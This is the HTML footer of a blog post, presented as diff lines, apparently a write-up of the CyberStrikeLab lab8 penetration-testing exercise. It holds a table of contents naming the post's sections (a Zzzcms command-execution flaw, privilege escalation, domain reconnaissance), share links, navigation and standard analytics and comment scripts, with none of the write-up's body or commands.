+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zzzcms-1-61-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Zzzcms 1.61 后台远程命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.2.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.3.</span> <span class="toc-text">域内信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">非约束委派 + 打印机漏洞</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&text=cyberstrikelab-lab8"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&is_video=false&description=cyberstrikelab-lab8"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-lab8&body=Check out this article: https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&title=cyberstrikelab-lab8"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&name=cyberstrikelab-lab8&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/22/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab8/&t=cyberstrikelab-lab8"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
